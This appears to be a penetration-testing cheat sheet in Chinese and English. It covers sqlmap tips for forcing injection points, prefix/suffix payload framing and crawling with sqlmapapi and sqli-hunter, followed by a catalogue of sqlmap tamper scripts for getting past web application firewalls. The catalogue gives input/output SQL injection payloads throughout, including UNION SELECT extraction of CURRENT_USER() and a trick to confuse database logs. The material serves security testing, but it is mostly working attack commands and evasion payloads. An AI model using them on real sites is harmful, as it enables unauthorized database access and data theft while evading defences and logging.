## 一、sqlmap tips
1). Sometimes sqlmap is unable to connect to the url at all. This is visible when it gets stuck at the first task of "testing connection to the target url". In such cases its helpful to use the "--random-agent" option. This makes sqlmap to use a valid user agent signature like the ones send by a browser like chrome or firefox.  

2). For urls that are not in the form of param=value sqlmap cannot automatically know where to inject. For example mvc urls like `http://www.site.com/class_name/method/43/80`.  

In such cases sqlmap needs to be told the injection point marked by a *  

`http://www.site.com/class_name/method/43*/80`  

The above will tell sqlmap to inject at the point marked by *  

3).明明扫描器扫出来的，手工测试也过了，可一到sqlmap就是302。  
可能是要重定向到error 页面，这种情况有时属于正常状况（部分boolean-based payload 会导致），但是总是这样，可能是referer（扫描器请求中找）中有限制，或者cookie要登陆，再或者是user-agent 需要换。  

4).sqlmap 默认测试所有的GET和POST 参数，当--level >=2 的时候也会测试 HTTP Cookie头的值，当>=3的时候也会测试User-Agent 和HTTP Referer头的值。但是你可以手动用-p 参数设置想要测试的参数。例如： -p "id,user-agent"  

当你使用--level 的值很大但是有个别参数不想测试的时候可以使用--skip 参数。例如：--skip="user-agent,referer"  

在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*  

例如：`python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"`  

sqlmap将会测试value1的位置是否可注入。   

5).参数：--prefix, --suffix  

在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload 的正常执行。  

例如，代码中是这样调用数据库的：  

`$query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";`  

这时你就需要--prefix和--suffix参数了：  

`python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"`  

这样执行的SQL语句变成：`$query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1"`;  

6).有些时候网站会“不小心”过滤掉各种字符，可以用tamper来解决（对付某些waf 时也有成效）  
把空格过滤掉了（应该还有所有不可见字符）  
--tamper=”space2comment.py”  
理论是用/**/代替空格  
同时如果过滤了其他字符，也可查阅手册可用的tamper选项。  

7).结合sqlmapapi + [sqli-hunter](https://github.com/zt2/sqli-hunter) 查找注入点  
开启 sqlmapapi python sqlmapapi.py -s  
开始 sqli-hunter 代理 ruby sqli-hunter.rb -p 8888  
设置浏览器代理为 8888端口，然后用鼠标去点击网页上的各种链接，会传递到sqli-hunter的代理服务器上，sqli-hunter与sqlmapapi交互检测注入点。检测到注入点会保存在tmp目录，使用sqlmap的-r参数进行注入就好了。  


## 二、SqlMap绕过WAF实例
apostrophemask.py UTF-8编码  
Example:  
* Input: AND '1'='1'  
* Output: AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87  

apostrophenullencode.py unicode编码  
Example:  
* Input: AND '1'='1'  
* Output: AND %00%271%00%27=%00%271%00%27  

appendnullbyte.py 添加%00  
Example:  
* Input: AND 1=1  
* Output: AND 1=1%00  
Requirement:  
* Microsoft Access  

base64encode.py base64编码  
Example:  
* Input: 1' AND SLEEP(5)#  
* Output: MScgQU5EIFNMRUVQKDUpIw==  

between.py 以“not between”替换“>”  
Example:  
* Input: 'A > B'  
* Output: 'A NOT BETWEEN 0 AND B'  

bluecoat.py 以随机的空白字符替代空格，以“like”替代“=”  
Example:  
* Input: SELECT id FROM users where id = 1  
* Output: SELECT%09id FROM users where id LIKE 1  
Requirement:  
* MySQL 5.1, SGOS  

chardoubleencode.py 双重url编码  
Example:  
* Input: SELECT FIELD FROM%20TABLE  
* Output: `%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545`  

charencode.py url编码  
Example:  
* Input: SELECT FIELD FROM%20TABLE  
* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45  

charunicodeencode.py 对未进行url编码的字符进行unicode编码  
Example:  
* Input: SELECT FIELD%20FROM TABLE  
* Output: `%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045'`  
Requirement:  
* ASP  
* ASP.NET  

equaltolike.py 以“like”替代“=”  
Example:  
* Input: SELECT * FROM users WHERE id=1  
* Output: SELECT * FROM users WHERE id LIKE 1  

halfversionedmorekeywords.py在每个关键字前添加条件注释  
Example:  
* Input: `value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa`  
* Output: `value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND 'QDWa'='QDWa`  
Requirement:  
* MySQL < 5.1  

ifnull2ifisnull.py 以“IF(ISNULL(A), B, A)”替换“IFNULL(A, B)”  
Example:  
* Input: IFNULL(1, 2)  
* Output: IF(ISNULL(1), 2, 1)  
Requirement:  
* MySQL  
* SQLite (possibly)  
* SAP MaxDB (possibly) 
 
modsecurityversioned.py 条件注释  
Example:  
* Input: 1 AND 2>1--  
* Output: `1 /*!30000AND 2>1*/--`  
Requirement:  
* MySQL  

modsecurityzeroversioned.py 条件注释，0000   
Example:  
* Input: 1 AND 2>1--  
* Output: `1 /*!00000AND 2>1*/--`  
Requirement:  
* MySQL  

multiplespaces.py 添加多个空格  
Example:   
* Input: UNION SELECT  
* Output:  UNION&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SELECT  

nonrecursivereplacement.py 可以绕过对关键字删除的防注入  
Example:  
* Input: 1 UNION SELECT 2--  
* Output: 1 UNUNIONION SELSELECTECT 2--  

percentage.py 在每个字符前添加百分号（%）   
Example:  
* Input: SELECT FIELD FROM TABLE  
* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E  
Requirement:  
* ASP  

randomcase.py 随即大小写  
Example:  
* Input: INSERT  
* Output: InsERt  

randomcomments.py 随机插入区块注释  
Example:  
'INSERT' becomes `'IN/**/S/**/ERT'`  

securesphere.py 语句结尾添加“真”字符串  
Example:  
* Input: AND 1=1  
* Output: AND 1=1 and '0having'='0having'  

sp_password.py 语句结尾添加“sp_password”迷惑数据库日志  
Example: 
* Input: 1 AND 9227=9227--  
* Output: 1 AND 9227=9227--sp_password  
Requirement:  
* MSSQL  

space2comment.py 以区块注释替换空格  
Example:  
* Input: SELECT id FROM users  
* Output:` SELECT/**/id/**/FROM/**/users`  

space2dash.py 以单行注释“--”和随机的新行替换空格  
Example:  
* Input: 1 AND 9227=9227  
* Output: 1--PTTmJopxdWJ%0AAND--cWfcVRPV%0A9227=9227  
Requirement:  
* MSSQL  
* SQLite  

space2hash.py 以单行注释“#”和由随机字符组成的新行替换空格  
Example:  
* Input: 1 AND 9227=9227  
* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227  
Requirement:  
* MySQL  

space2morehash.py 没看出来和上面那个有什么区别  
Requirement:  
* MySQL >= 5.1.13  

space2mssqlblank.py 以随机空白字符替换空格  
Example:  
* Input: SELECT id FROM users  
* Output: SELECT%08id%02FROM%0Fusers  
Requirement:  
* Microsoft SQL Server  

space2mssqlhash.py 以单行注释“#”和新行替换空格  
Example:  
* Input: 1 AND 9227=9227  
* Output: 1%23%0A9227=9227  
Requirement:  
* MSSQL  
* MySQL  

space2mysqlblank.py 以随机空白字符替换空格  
Example:  
* Input: SELECT id FROM users  
* Output: SELECT%0Bid%0BFROM%A0users  
Requirement:  
* MySQL  

space2mysqldash.py 以单行注释和新行替换空格  
Example:  
* Input: 1 AND 9227=9227  
* Output: 1--%0AAND--%0A9227=9227  
Requirement:  
* MySQL  
* MSSQL  

space2plus.py 以“+”替换空格  
Example:   
* Input: SELECT id FROM users  
* Output: SELECT+id+FROM+users  

space2randomblank.py 随机空白字符替换空格  
Example:  
* Input: SELECT id FROM users  
* Output: SELECT\rid\tFROM\nusers  

unionalltounion.py 以“union”替换“union all”  
Example:  
* Input: -1 UNION ALL SELECT  
* Output: -1 UNION SELECT  

unmagicquotes.py 以“%bf%27”替换单引号，并在结尾添加注释“--”  
Example:  
* Input: 1' AND 1=1  
* Output: 1%bf%27 AND 1=1--%20  

versionedkeywords.py 对不是函数的关键字条件注释  
Example:  
* Input: `1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#`  
* Output:  `1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#`  
Requirement:  
* MySQL  

versionedmorekeywords.py 对关键字条件注释  
Example:   
* `Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#`  
* Output: `1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#`  
Requirement:  
* MySQL >= 5.1.13  

 